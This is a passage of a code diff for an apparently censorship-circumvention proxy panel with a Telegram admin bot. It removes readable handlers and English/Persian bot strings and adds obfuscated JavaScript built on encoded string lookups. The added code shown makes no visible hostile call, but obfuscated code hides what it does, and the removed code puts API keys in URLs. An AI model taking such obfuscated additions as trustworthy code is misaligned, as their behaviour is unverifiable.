-async function handleSyncPanel(request, env, ctx) {
-    try {
-        const data = await request.json();
-        if (!data.signal || data.signal !== "panel_login") {
-            return new Response(
-                JSON.stringify({ success: false, error: "Invalid signal" }),
-                { status: 400 },
-            );
-        }
-        if (!data.tgAdminId || !data.panelHost) {
-            return new Response(
-                JSON.stringify({ success: false, error: "Missing fields" }),
-                { status: 400 },
-            );
-        }
-        // Verify the tgAdminId matches this panel's config
-        const adminId = sysConfig.tgAdminId || sysConfig.tgChatId;
-        if (!adminId || adminId.toString() !== data.tgAdminId.toString()) {
-            return new Response(
-                JSON.stringify({ success: false, error: "Unauthorized" }),
-                { status: 401 },
-            );
-        }
-        // Also verify a valid panelApiKey if one was provided
-        if (data.panelApiKey && !isPanelApiKey(data.panelApiKey)) {
-            return new Response(
-                JSON.stringify({ success: false, error: "Unauthorized" }),
-                { status: 401 },
-            );
-        }
-        const loginSignal = {
-            name: data.panelName || data.panelHost,
-            host: data.panelHost,
-            apiRoute: data.panelApiRoute || sysConfig.apiRoute,
-            isLocal: false,
-            ts: data.ts || Date.now(),
-        };
-        if (env.IOT_DB) {
-            ctx?.waitUntil(
-                d1Put(env, "tg_panel_login", JSON.stringify(loginSignal)).catch(
-                    () => {},
-                ),
-            );
-        }
-        return new Response(JSON.stringify({ success: true }), { status: 200 });
-    } catch (e) {
-        return new Response(JSON.stringify({ success: false }), {
-            status: 400,
-        });
-    }
-}
-
-const botI18n = {
-    en: {
-        welcome:
-            "🤖 **Welcome to Nahan Gateway Bot**\nSelect your option below to manage your system:",
-        status: "System Status",
-        users: "Subscribers",
-        metrics: "Gateway Health",
-        panic: "Panic Mode",
-        dash: "Dashboard Control",
-        lang: "🌐 Change Language",
-        active: "🟢 Active",
-        paused: "🔴 Paused",
-        uptime: "Uptime",
-        streams: "📡 Active Streams",
-        no_users: "No subscribers found.",
-        sub_info: "👤 Subscriber Details:",
-        name: "Name",
-        total: "Total Reqs",
-        daily: "Daily Reqs",
-        expiry: "Expiry",
-        days: "Days remaining",
-        created: "Created At",
-        unlimited: "Unlimited",
-        btn_back: "◀️ Back",
-        btn_next: "▶️ Next",
-        btn_del: "Delete",
-        btn_pause: "Pause",
-        btn_resume: "Resume",
-        btn_edit_name: "Change Name",
-        btn_edit_limits: "Limits",
-        btn_add: "+ Add Subscriber",
-        btn_confirm: "Confirm",
-        btn_cancel: "Cancel",
-        msg_enter_name: "Please send a name for the subscriber:",
-        msg_added: "Sub added successfully! 🎉",
-        msg_deleted: "Sub deleted successfully! 🗑️",
-        msg_panic:
-            "🚨 PANIC MODE ACTIVATED 🚨\nRoute randomized & System Paused.",
-        msg_invalid: "Invalid input. Please try again.",
-        msg_enter_limits:
-            "Enter limits format:\n`[totalReqs] [dailyReqs] [days_limit]`\n(Use 0 for unlimited)\n\nExample:\n`10000 500 30`",
-        msg_confirm_del: "⚠️ Are you sure you want to delete this subscriber?",
-        msg_confirm_panic:
-            "⚠️ Are you absolutely sure you want to trigger PANIC mode? This will randomize API routes and pause all connections!",
-        status_updated: "Status updated!",
-        access_denied:
-            "Access Denied. You are not authorized to manage this panel.",
-        dashboard: "Dashboard",
-        search: "Search User",
-        statistics: "Statistics",
-        panel_info: "Panel Info",
-        disabled_users: "Disabled Users",
-        reset_traffic: "Reset Traffic",
-        extend_expiry: "Extend Expiry",
-        notes: "Notes",
-        device_limit: "Config Limit",
-        msg_enter_search:
-            "🔍 Send a username, UUID, or subscription to search:",
-        msg_enter_notes: "📝 Send notes for this user:",
-        msg_enter_extend_days: "📅 Enter number of days to extend expiration:",
-        msg_traffic_reset: "Traffic has been reset successfully!",
-        msg_expiry_extended: "Expiration extended by {days} days!",
-        msg_no_disabled: "No disabled users found.",
-        msg_enter_device_limit: "Enter config limit (0 for unlimited):",
-        config_limit_updated: "Config limit updated!",
-        stats_title: "Panel Statistics",
-        count_active: "active",
-        count_paused: "paused",
-        count_disabled: "auto-disabled",
-        dash_total: "Total Users",
-        dash_active: "Active",
-        dash_paused: "Paused",
-        dash_expired: "Expired",
-        dash_auto_disabled: "Auto-Disabled",
-        btn_main_menu: "Main Menu",
-        btn_back_to_list: "Back to List",
-        total_traffic: "Total Traffic",
-        daily_traffic: "Daily Traffic",
-        lbl_status: "Status",
-        lbl_subscription: "Subscription Connection",
-        lbl_user_not_found: "⚠️ User not found",
-        lbl_none: "None",
-        lbl_page: "Page",
-        select_panel: "🔌 Which panel do you want to manage?",
-        current_panel: "Current Panel",
-        switch_panel: "🔄 Switch Panel",
-        panel_local: "🏠 This Panel",
-        panel_remote: "🌐",
-        msg_panel_selected: "Panel selected! ✅",
-        msg_panel_error: "❌ Failed to connect to the selected panel.",
-        msg_panel_unreachable:
-            "⚠️ Panel is unreachable. Please check the configuration.",
-        btn_sub_link: "Subscription Link",
-        sub_link_sent: "Subscription link sent!",
-        btn_update_usage: "Update Usage",
-        tg_settings: "Settings",
-        tg_advanced: "Advanced",
-        tg_logs: "Logs",
-        tg_sys_settings: "System Settings",
-        tg_adv_settings: "Advanced Settings",
-        tg_logs_view: "View Logs",
-        tg_logs_clear: "Clear Logs",
-        tg_proto: "Protocol",
-        tg_ports: "Ports",
-        tg_uuid: "Device UUID",
-        tg_path: "API Route",
-        tg_pass: "Master Key",
-        tg_dns: "DNS",
-        tg_relay: "Relay IP",
-        tg_maintenance: "Maintenance Hosts",
-        tg_tfo: "TCP Fast Open",
-        tg_ech: "ECH",
-        tg_silent: "Silent Alerts",
-        tg_pause: "Kill Switch",
-        tg_auto_update: "Auto Update",
-        tg_direct: "Direct Configs",
-        tg_nat64: "NAT64",
-        tg_clean_ips: "Clean IPs",
-        tg_nodes: "Nodes",
-        tg_strategy: "Name Strategy",
-        tg_prefix: "Name Prefix",
-        tg_fake_entries: "Fake Entries",
-        tg_cf_settings: "Cloudflare Settings",
-        tg_tg_settings: "Telegram Settings",
-        tg_backup: "Backup",
-        tg_restore: "Restore",
-        tg_current_val: "Current Value",
-        tg_new_val: "Send new value:",
-        tg_saved: "Saved!",
-        tg_cancelled: "Cancelled",
-        tg_log_entry: "",
-        tg_log_empty: "No logs found",
-        tg_u_custom_name: "Custom Name",
-        tg_u_clean_ips: "Clean IPs",
-        tg_u_proxy_ips: "Proxy IPs",
-        tg_u_nodes: "Nodes",
-        tg_u_nat64: "NAT64",
-        tg_u_mode: "Protocol Mode",
-        tg_u_ports: "Ports",
-        tg_u_conn_limit: "Conn Limit",
-        tg_u_panel_url: "Panel URL",
-        tg_u_max_cfg: "Max Configs",
-        tg_u_all: "All Settings",
-        tg_network: "Network",
-        tg_uptime: "Uptime",
-        tg_conns: "Active Connections",
-        tg_version: "Version",
-        tg_cf_usage: "CF Usage",
-    },
-    fa: {
-        welcome:
-            "🤖 **به ربات ترانزیت نهان خوش آمدید**\nجهت مدیریت سیستم نظارتی خود یکی از گزینه‌های زیر را انتخاب نمایید:",
-        status: "وضعیت سیستم",
-        users: "مدیریت مشترکین",
-        metrics: "سلامت درگاه شبکه",
-        panic: "وضعیت اضطراری (Panic)",
-        dash: "پنل تحت وب",
-        lang: "🌐 تغییر زبان به انگلیسی",
-        active: "🟢 فعال",
-        paused: "🔴 متوقف شده",
-        uptime: "زمان کارکرد",
-        streams: "📡 اتصالات فعال",
-        no_users: "هیچ مشترکی پیدا نشد.",
-        sub_info: "👤 مشخصات مشترک:",
-        name: "نام",
-        total: "درخواست کل",
-        daily: "درخواست روزانه",
-        expiry: "انقضاء",
-        days: "روزهای باقی‌مانده",
-        created: "تاریخ ایجاد",
-        unlimited: "نامحدود",
-        btn_back: "بازگشت",
-        btn_next: "بعدی",
-        btn_del: "حذف",
-        btn_pause: "غیرفعال‌سازی",
-        btn_resume: "فعال‌سازی",
-        btn_edit_name: "تغییر نام",
-        btn_edit_limits: "ویرایش محدودیت‌ها",
-        btn_add: "+ افزودن مشترک جدید",
-        btn_confirm: "تأیید",
-        btn_cancel: "انصراف",
-        msg_enter_name: "لطفاً نام یا شناسه مشترک جدید را ارسال نمایید:",
-        msg_added: "مشترک با موفقیت افزوده شد!",
-        msg_deleted: "مشترک با موفقیت حذف گردید!",
-        msg_panic: "وضعیت اضطراری فعال شد\nمسیر تصادفی شد و سیستم متوقف گردید.",
-        msg_invalid: "ورودی نامعتبر است. مجدداً تلاش نمایید.",
-        msg_enter_limits:
-            "فرمت ورودی محدودیت:\n`[کل] [روزانه] [مدت_روز]`\n(از 0 برای نامحدود استفاده کنید)\n\nمثال:\n`10000 500 30`",
-        msg_confirm_del: "آیا از حذف این مشترک اطمینان کامل دارید؟",
-        msg_confirm_panic:
-            "آیا از فعال‌سازی وضعیت اضطراری اطمینان دارید؟ کل اتصالات متوقف و آدرس‌ها منقضی خواهند شد!",
-        status_updated: "وضعیت بروزرسانی شد!",
-        access_denied: "دسترسی غیرمجاز. شما اجازه مدیریت این پنل را ندارید.",
-        dashboard: "داشبورد",
-        search: "جستجوی کاربر",
-        statistics: "آمار",
-        panel_info: "اطلاعات پنل",
-        disabled_users: "کاربران غیرفعال",
-        reset_traffic: "بازنشانی ترافیک",
-        extend_expiry: "تمدید انقضا",
-        notes: "یادداشت‌ها",
-        device_limit: "محدودیت کانفیگ",
-        msg_enter_search: "🔍 نام کاربری، UUID یا لینک اشتراک را ارسال کنید:",
-        msg_enter_notes: "📝 یادداشت برای این کاربر را ارسال کنید:",
-        msg_enter_extend_days: "📅 تعداد روزهای تمدید را وارد کنید:",
-        msg_traffic_reset: "ترافیک با موفقیت بازنشانی شد!",
-        msg_expiry_extended: "انقضا به مدت {days} روز تمدید شد!",
-        msg_no_disabled: "هیچ کاربر غیرفعالی یافت نشد.",
-        msg_enter_device_limit:
-            "محدودیت تعداد کانفیگ را وارد کنید (0 برای نامحدود):",
-        config_limit_updated: "محدودیت کانفیگ به‌روزرسانی شد!",
-        stats_title: "آمار پنل",
-        count_active: "فعال",
-        count_paused: "متوقف",
-        count_disabled: "غیرفعال خودکار",
-        dash_total: "کل کاربران",
-        dash_active: "فعال",
-        dash_paused: "متوقف",
-        dash_expired: "منقضی",
-        dash_auto_disabled: "غیرفعال خودکار",
-        btn_main_menu: "منوی اصلی",
-        btn_back_to_list: "بازگشت به لیست",
-        total_traffic: "ترافیک کل",
-        daily_traffic: "ترافیک روزانه",
-        lbl_status: "وضعیت",
-        lbl_subscription: "لینک اشتراک",
-        lbl_user_not_found: "⚠️ کاربر یافت نشد",
-        lbl_none: "ندارد",
-        lbl_page: "صفحه",
-        select_panel: "🔌 کدام پنل را می‌خواهید مدیریت کنید؟",
-        current_panel: "پنل فعلی",
-        switch_panel: "🔄 تغییر پنل",
-        panel_local: "🏠 این پنل",
-        panel_remote: "🌐",
-        msg_panel_selected: "پنل انتخاب شد! ✅",
-        msg_panel_error: "❌ اتصال به پنل انتخابی ناموفق بود.",
-        msg_panel_unreachable:
-            "⚠️ پنل در دسترس نیست. لطفاً پیکربندی را بررسی کنید.",
-        btn_sub_link: "لینک اشتراک",
-        sub_link_sent: "لینک اشتراک ارسال شد!",
-        btn_update_usage: "بروزرسانی مصرف",
-        tg_settings: "تنظیمات",
-        tg_advanced: "پیشرفته",
-        tg_logs: "گزارش‌ها",
-        tg_sys_settings: "تنظیمات سیستم",
-        tg_adv_settings: "تنظیمات پیشرفته",
-        tg_logs_view: "مشاهده گزارش‌ها",
-        tg_logs_clear: "پاک کردن گزارش‌ها",
-        tg_proto: "پروتکل",
-        tg_ports: "پورت‌ها",
-        tg_uuid: "شناسه دستگاه",
-        tg_path: "مسیر API",
-        tg_pass: "کلید اصلی",
-        tg_dns: "DNS",
-        tg_relay: "آی‌پی رله",
-        tg_maintenance: "سایت استتار",
-        tg_tfo: "TCP Fast Open",
-        tg_ech: "ECH",
-        tg_silent: "هشدار خاموش",
-        tg_pause: "کلید توقف",
-        tg_auto_update: "بروزرسانی خودکار",
-        tg_direct: "کانفیگ مستقیم",
-        tg_nat64: "NAT64",
-        tg_clean_ips: "آی‌پی تمیز",
-        tg_nodes: "نودها",
-        tg_strategy: "روش نام‌گذاری",
-        tg_prefix: "پیشوند",
-        tg_fake_entries: "ورودی‌های اشتراک",
-        tg_cf_settings: "تنظیمات کلودفلر",
-        tg_tg_settings: "تنظیمات تلگرام",
-        tg_backup: "پشتیبان‌گیری",
-        tg_restore: "بازیابی",
-        tg_current_val: "مقدار فعلی",
-        tg_new_val: "مقدار جدید را ارسال کنید:",
-        tg_saved: "ذخیره شد!",
-        tg_cancelled: "لغو شد",
-        tg_log_entry: "",
-        tg_log_empty: "گزارشی ثبت نشده",
-        tg_u_custom_name: "نام سفارشی",
-        tg_u_clean_ips: "آی‌پی تمیز",
-        tg_u_proxy_ips: "آی‌پی پروکسی",
-        tg_u_nodes: "نودها",
-        tg_u_nat64: "NAT64",
-        tg_u_mode: "پروتکل",
-        tg_u_ports: "پورت‌ها",
-        tg_u_conn_limit: "محدودیت اتصال",
-        tg_u_panel_url: "آدرس پنل",
-        tg_u_max_cfg: "حداکثر کانفیگ",
-        tg_u_all: "همه تنظیمات",
-        tg_network: "شبکه",
-        tg_uptime: "زمان کارکرد",
-        tg_conns: "اتصالات فعال",
-        tg_version: "نسخه",
-        tg_cf_usage: "مصرف کلودفلر",
-    },
+const var_c = {
+  [func_dec(24)]: func_dec(3),
+  [func_dec(25)]: func_dec(26),
+  [func_dec(27)]: func_dec(28),
+  [func_dec(29)]: func_dec(3),
+  [func_dec(30)]: func_dec(3),
+  [func_dec(31)]: func_dec(32),
+  [func_dec(33)]: func_dec(34),
+  [func_dec(35)]: func_dec(3),
+  [func_dec(36)]: func_dec(3),
+  [func_dec(37)]: func_dec(3),
+  [func_dec(38)]: func_dec(39),
+  [func_dec(40)]: func_dec(41),
+  [func_dec(42)]: func_dec(43),
+  [func_dec(44)]: func_dec(45),
+  [func_dec(46)]: func_dec(47),
+  [func_dec(48)]: func_dec(3),
+  [func_dec(49)]: false,
+  [func_dec(50)]: false,
+  [func_dec(51)]: func_dec(3),
+  [func_dec(52)]: func_dec(3),
+  [func_dec(53)]: func_dec(3),
+  [func_dec(54)]: func_dec(3),
+  [func_dec(55)]: func_dec(3),
+  [func_dec(56)]: func_dec(3),
+  [func_dec(57)]: false,
+  [func_dec(58)]: false,
+  [func_dec(59)]: func_dec(60),
+  [func_dec(61)]: func_dec(62),
+  [func_dec(63)]: func_dec(64),
+  [func_dec(65)]: func_dec(66),
+  [func_dec(67)]: [],
+  [func_dec(68)]: func_dec(3),
+  [func_dec(69)]: func_dec(3),
+  [func_dec(70)]: 0,
+  [func_dec(71)]: 0,
+  [func_dec(72)]: [],
+  [func_dec(73)]: func_dec(3),
+  [func_dec(74)]: func_dec(3),
+  [func_dec(75)]: [],
+  [func_dec(76)]: func_dec(3),
+  [func_dec(77)]: false,
+  [func_dec(78)]: func_dec(3),
+  [func_dec(79)]: func_dec(3),
+  [func_dec(80)]: false,
+  [func_dec(81)]: func_dec(82),
+  [func_dec(83)]: [{
+    [func_dec(24)]: func_dec(84),
+    [func_dec(85)]: true
+  }, {
+    [func_dec(24)]: func_dec(86),
+    [func_dec(85)]: true
+  }],
+  [func_dec(87)]: false,
+  [func_dec(88)]: true,
+  [func_dec(89)]: true
 };
-
-function getPanelsList() {
-    const panels = [];
-    panels.push({
-        name: sysConfig.name || "Main Panel",
-        host: null,
-        apiRoute: sysConfig.apiRoute,
-        apiKey: null,
-        isLocal: true,
-    });
-    if (sysConfig.linkedPanels && Array.isArray(sysConfig.linkedPanels)) {
-        sysConfig.linkedPanels.forEach((p) => {
-            if (p && p.host) {
-                panels.push({
-                    name: p.name || p.host,
-                    host: p.host,
-                    apiRoute: p.apiRoute || sysConfig.apiRoute,
-                    apiKey: p.apiKey || p.masterKey || null,
-                    isLocal: false,
-                });
-            }
-        });
-    }
-    return panels;
+let var_d = {
+  ...var_c
+};
+let var_e = 0;
+let var_f = 0;
+let var_g = 0;
+let var_h = 0;
+function func_i() {
+  try {
+    if (var_g > 200 || var_h > 400) return 2;
+    if (var_g > 100 || var_h > 200) return 1;
+  } catch (var_ct) {}
+  return 0;
 }
-
-async function remotePanelFetch(panel, method, path, body = null) {
+function func_j(var_cu) {
+  return new Promise(var_cv => setTimeout(var_cv, var_cu));
+}
+function func_k(var_cw, var_cx, var_cy) {
+  let var_cz = null;
+  const var_da = new Promise((var_db, var_dc) => {
+    var_cz = setTimeout(() => {
+      try {
+        var_dc(new Error(var_cy || func_dec(90)));
+      } catch (var_dd) {}
+    }, var_cx);
+  });
+  return Promise[func_dec(92)]([var_cw, var_da])[func_dec(91)](() => {
     try {
-        const url = `https://${panel.host}/${encodeURI(panel.apiRoute)}${path}`;
-        const options = {
-            method,
-            headers: { "Content-Type": "application/json" },
-        };
-        if (body) options.body = JSON.stringify(body);
-        const res = await fetchT(url, {
-            ...options,
-            signal: AbortSignal.timeout(8000),
-        });
-        return await res.json();
-    } catch (e) {
-        return { success: false, error: e.message };
+      if (var_cz) clearTimeout(var_cz);
+    } catch (var_de) {}
+  });
+}
+const var_i = 5000;
+const var_j = 5000;
+const var_k = 7000;
+const var_l = 15000;
+const var_m = 120000;
+const var_n = 4 * 1024 * 1024;
+const var_o = 256;
+function func_l(var_df) {
+  try {
+    if (var_df && typeof var_df[func_dec(93)] === func_dec(94)) var_df[func_dec(93)]();
+  } catch (var_dg) {}
+}
+function func_m(var_dh) {
+  try {
+    if (var_dh && typeof var_dh[func_dec(95)] === func_dec(94)) var_dh[func_dec(95)]();
+  } catch (var_di) {}
+}
+async function func_n(var_dj, var_dk, var_dl, var_dm = func_dec(96)) {
+  let var_dn = null;
+  let var_do = false;
+  const var_dp = new Promise((var_dq, var_dr) => {
+    var_dn = setTimeout(() => {
+      if (var_do) return;
+      try {
+        if (typeof var_dl === func_dec(94)) var_dl();
+      } catch (var_ds) {}
+      var_dr(new Error(func_dec(3) + var_dm + func_dec(97)));
+    }, var_dk);
+  });
+  try {
+    return await Promise[func_dec(92)]([var_dj, var_dp]);
+  } finally {
+    var_do = true;
+    if (var_dn) {
+      try {
+        clearTimeout(var_dn);
+      } catch (var_dt) {}
     }
+  }
 }
-
-async function fetchRemotePanelUsers(panel) {
-    return await remotePanelFetch(
-        panel,
-        "GET",
-        `/api/users?key=${encodeURIComponent(panel.apiKey)}`,
-    );
+async function func_o(var_du, var_dv, var_dw, var_dx = var_j) {
+  if (!var_dv || typeof var_dv[func_dec(98)] !== func_dec(94)) throw new Error(func_dec(99));
+  return await func_n(var_dv[func_dec(98)](var_dw), var_dx, () => func_l(var_du), func_dec(100));
 }
-
-async function fetchRemotePanelUser(panel, userId) {
-    return await remotePanelFetch(
-        panel,
-        "GET",
-        `/api/users?id=${encodeURIComponent(userId)}&key=${encodeURIComponent(panel.apiKey)}`,
-    );
-}
-
-async function fetchRemotePanelStats(panel) {
-    return await remotePanelFetch(
-        panel,
-        "GET",
-        `/api/stats?key=${encodeURIComponent(panel.apiKey)}`,
-    );
-}
-
-async function fetchRemotePanelConfig(panel) {
-    return await remotePanelFetch(panel, "POST", "/api/auth", {
-        key: panel.apiKey,
-    });
-}
-
-async function remotePanelWriteAction(panel, method, userId, body = null) {
-    let path = "/api/users";
-    if (userId)
-        path += `?id=${encodeURIComponent(userId)}&key=${encodeURIComponent(panel.apiKey)}`;
-    else path += `?key=${encodeURIComponent(panel.apiKey)}`;
-    return await remotePanelFetch(
-        panel,
-        method,
-        path,
-        body || { key: panel.apiKey },
-    );
-}
-
-async function remotePanelToggleUser(panel, userId) {
-    return await remotePanelFetch(
-        panel,
-        "POST",
-        `/api/users?id=${encodeURIComponent(userId)}&action=toggle&key=${encodeURIComponent(panel.apiKey)}`,
-    );
-}
-
-async function remotePanelResetTraffic(panel, userId) {
-    return await remotePanelFetch(
-        panel,
-        "POST",
-        `/api/users?id=${encodeURIComponent(userId)}&action=reset&key=${encodeURIComponent(panel.apiKey)}`,
-    );
-}
-
-async function handleTelegramWebhook(request, env, hostName, ctx) {
-    try {
-        const update = await request.json();
-        const tgApi = `https://api.telegram.org/bot${sysConfig.tgToken}`;
-
-        const langCode = sysConfig.tgBotLang || "fa";
-        const t = (key) =>
-            botI18n[langCode]?.[key] || botI18n["en"]?.[key] || key;
-
-        const callerId =
-            update.callback_query?.from?.id?.toString() ||
-            update.message?.from?.id?.toString();
-        const adminId = sysConfig.tgAdminId || sysConfig.tgChatId;
-        const isAuthorized = adminId && callerId === adminId.toString();
-
-        if (!isAuthorized) {
-            const chatId =
-                update.callback_query?.message?.chat?.id ||
-                update.message?.chat?.id;
-            if (chatId) {
-                await fetchT(`${tgApi}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text:
-                            "❌ *شما دسترسی به این ربات را ندارید.*\n\nیوزر آیدی شما جهت اضافه کردن به لیست ادمین ها: `" +
-                            (callerId || "Unknown") +
-                            "`",
-                        parse_mode: "Markdown",
-                    }),
-                });
-            }
-            return new Response(
-                JSON.stringify({ success: false, error: "Unauthorized" }),
-                { status: 200 },
-            );
-        }
-
-        let tgState = {};
-        try {
-            const storedState = await d1Get(env, "tg_bot_state");
-            if (storedState) tgState = JSON.parse(storedState);
-        } catch (e) {}
-
-        const panels = getPanelsList();
-
-        // Read last login signal from D1 (set by handleAuth or handleSyncPanel)
-        let lastLoginPanel = null;
-        try {
-            const stored = await d1Get(env, "tg_panel_login");
-            if (stored) lastLoginPanel = JSON.parse(stored);
-        } catch (e) {}
-
-        const getActivePanel = () => {
-            if (lastLoginPanel) {
-                if (lastLoginPanel.isLocal)
-                    return panels.find((p) => p.isLocal) || panels[0];
-                const found = panels.find(
-                    (p) => !p.isLocal && p.host === lastLoginPanel.host,
-                );
-                if (found) return found;
-                // Remote panel not in linkedPanels — synthesize from login signal
-                return {
-                    name: lastLoginPanel.name || lastLoginPanel.host,
-                    host: lastLoginPanel.host,
-                    apiRoute: lastLoginPanel.apiRoute || sysConfig.apiRoute,
-                    apiKey:
-                        lastLoginPanel.apiKey ||
-                        lastLoginPanel.masterKey ||
-                        null,
-                    isLocal: false,
-                };
-            }
-            return panels[0]; // default to local
-        };
-
-        // Custom sendOrEdit message helper
-        const sendOrEdit = async (
-            chatId,
-            text,
-            replyMarkup = null,
-            messageId = null,
-        ) => {
-            let res;
-            if (messageId) {
-                res = await fetchT(`${tgApi}/editMessageText`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        message_id: messageId,
-                        text: text,
-                        parse_mode: "Markdown",
-                        reply_markup: replyMarkup,
-                    }),
-                });
-                if (res.ok) return res;
-                try {
-                    const errBody = await res.json();
-                    if (
-                        errBody?.description?.includes(
-                            "message is not modified",
-                        )
-                    )
-                        return res;
-                } catch (e) {}
-            }
-            res = await fetchT(`${tgApi}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: text,
-                    parse_mode: "Markdown",
-                    reply_markup: replyMarkup,
-                }),
-            });
-            return res;
-        };
-
-        const getMainMenu = (activePanel, isAdmin = true) => {
-            const isPaused = sysConfig.isPaused || false;
-            const statusEmoji = isPaused ? "🔴" : "🟢";
-            const users = sysConfig.users || [];
-            const activeCount = users.filter(
-                (u) => !u.isPaused && (!u.expiryMs || Date.now() <= u.expiryMs),
-            ).length;
-            const pausedCount = users.filter(
-                (u) => u.isPaused && !u.disabledReason,
-            ).length;
-            const autoDisabledCount = users.filter(
-                (u) => u.isPaused && u.disabledReason,
-            ).length;
-            const isLocal = !activePanel || activePanel.isLocal;
-            const panelName = activePanel
-                ? activePanel.name
-                : sysConfig.name || "Main Panel";
-            const panelIndicator = isLocal
-                ? `🏠 ${panelName}`
-                : `🌐 ${panelName}`;
-            let text =
-                `${t("welcome")}\n\n` +
-                `━━━━━━━━━━━━━━━━\n` +
-                `📌 **${t("current_panel")}**: ${panelIndicator}\n` +
-                `⚡ **${t("status")}**: ${isPaused ? t("paused") : t("active")} ${statusEmoji}\n` +
-                `👥 **${t("users")}**: ${users.length} (${activeCount} ${t("count_active")}, ${pausedCount} ${t("count_paused")}, ${autoDisabledCount} ${t("count_disabled")})\n` +
-                `━━━━━━━━━━━━━━━━`;
-            const panelUrl = isLocal
-                ? `https://${hostName}/${encodeURI(sysConfig.apiRoute)}/dash`
-                : null;
-            const subUrl = `https://${hostName}/${sysConfig.apiRoute}`;
-            /** @type {any} */
-            const inline_keyboard = [];
-            if (isAdmin) {
-                inline_keyboard.push([
-                    { text: `👥 ${t("users")}`, callback_data: "subs_list:0" },
-                    {
-                        text: `🔍 ${t("search")}`,
-                        callback_data: "sub_search_init",
-                    },
-                ]);
-            }
-            inline_keyboard.push([
-                {
-                    text: `📊 ${t("dashboard")}`,
-                    callback_data: "sys_dashboard",
-                },
-                { text: `📈 ${t("statistics")}`, callback_data: "sys_stats" },
-            ]);
-            inline_keyboard.push([
-                {
-                    text: `🔗 ${t("btn_sub_link")}`,
-                    callback_data: "get_sub_link",
-                },
-            ]);
-            if (isAdmin) {
-                inline_keyboard.push([
-                    {
-                        text: `🚫 ${t("disabled_users")}`,
-                        callback_data: "subs_disabled:0",
-                    },
-                ]);
-                inline_keyboard.push([
-                    {
-                        text: `⚙️ ${t("tg_settings")}`,
-                        callback_data: "tg_settings_menu",
-                    },
-                    {
-                        text: `🔧 ${t("tg_advanced")}`,
-                        callback_data: "tg_advanced_menu",
-                    },
-                ]);
-                inline_keyboard.push([
-                    {
-                        text: `📋 ${t("tg_logs")}`,
-                        callback_data: "tg_logs_menu",
-                    },
-                ]);
-            }
-            inline_keyboard.push([
-                {
-                    text: `🌐 ${langCode === "fa" ? "English 🇺🇸" : "فارسی 🇮🇷"}`,
-                    callback_data: "sys_lang",
-                },
-                {
-                    text: isPaused
-                        ? `▶️ ${t("btn_resume")}`
-                        : `⏸️ ${t("btn_pause")}`,
-                    callback_data: "sys_toggle_status",
-                },
-            ]);
-            if (panelUrl) {
-                inline_keyboard.push([
-                    { text: `🔑 ${t("dash")}`, web_app: { url: panelUrl } },
-                    {
-                        text: `ℹ️ ${t("panel_info")}`,
-                        callback_data: "sys_panel_info",
-                    },
-                ]);
-                if (isAdmin) {
-                    inline_keyboard.push([
-                        {
-                            text: `🚨 ${t("panic")}`,
-                            callback_data: "sys_panic_init",
-                        },
-                    ]);
-                }
-            } else {
-                inline_keyboard.push([
-                    {
-                        text: `ℹ️ ${t("panel_info")}`,
-                        callback_data: "sys_panel_info",
-                    },
-                ]);
-            }
-            const kb = { inline_keyboard };
-            return { text, kb };
-        };
-
-        const getSubsList = (page = 0, usersList = null) => {
-            const users = usersList || sysConfig.users || [];
-            const itemsPerPage = 5;
-            const totalPages = Math.ceil(users.length / itemsPerPage);
-            const start = page * itemsPerPage;
-            const end = start + itemsPerPage;
-            const pageUsers = users.slice(start, end);
-
-            let text = `👥 **${t("users")}** (${t("lbl_page")} ${page + 1}/${Math.max(1, totalPages)})\n`;
-            text += `━━━━━━━━━━━━━━━━\n`;
-
-            if (users.length === 0) {
-                text += `⚠️ ${t("no_users")}\n`;
-            } else {
-                pageUsers.forEach((u, idx) => {
-                    text += `${start + idx + 1}. 👤 **${u.name}**\n   \`${u.id}\`\n`;
-                });
-            }
-            text += `━━━━━━━━━━━━━━━━`;
-
-            const inline_keyboard = [];
-            pageUsers.forEach((u) => {
-                inline_keyboard.push([
-                    {
-                        text: `👤 ${u.name}`,
-                        callback_data: `sub_detail:${u.id}`,
-                    },
-                ]);
-            });
-
-            const navRow = [];
-            if (page > 0) {
-                navRow.push({
-                    text: `⬅️ ${t("btn_back")}`,
-                    callback_data: `subs_list:${page - 1}`,
-                });
-            }
-            if (end < users.length) {
-                navRow.push({
-                    text: `${t("btn_next")} ➡️`,
-                    callback_data: `subs_list:${page + 1}`,
-                });
-            }
-            if (navRow.length > 0) {
-                inline_keyboard.push(navRow);
-            }
-
-            inline_keyboard.push([
-                { text: `➕ ${t("btn_add")}`, callback_data: "sub_add_init" },
-            ]);
-            inline_keyboard.push([
-                { text: t("btn_main_menu"), callback_data: "main_menu" },
-            ]);
-
-            return { text, kb: { inline_keyboard } };
-        };
-
-        const getSubDetail = (uuid, usersList = null) => {
-            const users = usersList || sysConfig.users || [];
-            const u = users.find((usr) => usr.id === uuid);
-            if (!u) {
-                return {
-                    text: "⚠️ User not found",
-                    kb: {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: t("btn_back"),
-                                    callback_data: "subs_list:0",
-                                },
-                            ],
-                        ],
-                    },
-                };
-            }
-
-            const sysU = sysUsageCache?.users?.[
-                u.id.replace(/-/g, "").toLowerCase()
-            ] || { reqs: 0, dReqs: 0, lastDay: "" };
-            const userReqs = sysU.reqs || 0;
-            const curDate = new Date().toISOString().split("T")[0];
-            const userDReqs = sysU.lastDay === curDate ? sysU.dReqs || 0 : 0;
-
-            const limitTotalTxt = u.limitTotalReq
-                ? `${u.limitTotalReq}`
-                : t("unlimited");
-            const limitDailyTxt = u.limitDailyReq
-                ? `${u.limitDailyReq}`
-                : t("unlimited");
-            const usedGB = (usageTotalBytes(sysU) / 1073741824).toFixed(2);
-            const limitGB = u.limitTotalReq
-                ? (limitReqToBytes(u.limitTotalReq) / 1073741824).toFixed(2)
-                : t("unlimited");
-
-            let expTxt = t("unlimited");
-            let isExp = false;
-            let daysLeft = t("unlimited");
-            if (u.expiryMs) {
-                const date = new Date(u.expiryMs);
-                expTxt = date.toLocaleDateString();
-                const remDays = Math.ceil((u.expiryMs - Date.now()) / 86400000);
-                daysLeft = remDays >= 0 ? `${remDays}` : "0";
-                if (Date.now() > u.expiryMs) {
-                    expTxt += ` (${t("dash_expired")} 🔴)`;
-                    isExp = true;
-                }
-            }
